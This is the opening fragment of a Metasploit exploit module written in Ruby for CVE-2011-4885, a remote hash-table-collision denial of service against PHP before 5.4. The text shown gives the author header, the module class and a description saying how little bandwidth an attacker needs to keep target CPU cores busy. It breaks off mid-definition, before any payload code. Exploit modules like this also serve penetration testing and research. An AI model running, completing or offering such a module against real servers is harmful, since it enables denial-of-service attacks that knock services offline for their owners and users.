#
# CVE-2011-4885 metasploit exploit for PHP < 5.4
# Written by David Busby <d.busby@saiweb.co.uk>
# Original information from: http://seclists.org/fulldisclosure/2011/Dec/477


require 'msf/core'
class Metasploit3 < Msf::Exploit::Remote
    include Msf::Exploit::Remote::HttpClient
    
    def initialize(info = {})
        super(update_info(info,
                'Name'          => 'PHP < 5.4 CVE-2011-4885 remote hash table collision DoS',
                'Description'   => %q {
                                        This module exploits the php internal hashing algo to cause hash collisions in the application,
                                        On an i7 core, the 60 seconds take a string of multi-collisions of about500k. 30 seconds of CPU time can be generated using a string of about300k.
                                        This means that an attacker needs about 70-100kbit/s to keep one i7 core constantly busy.
                                        An attacker with a Gigabit connection can keep about 10000 i7 cores busy.
                                    },
                 ' 
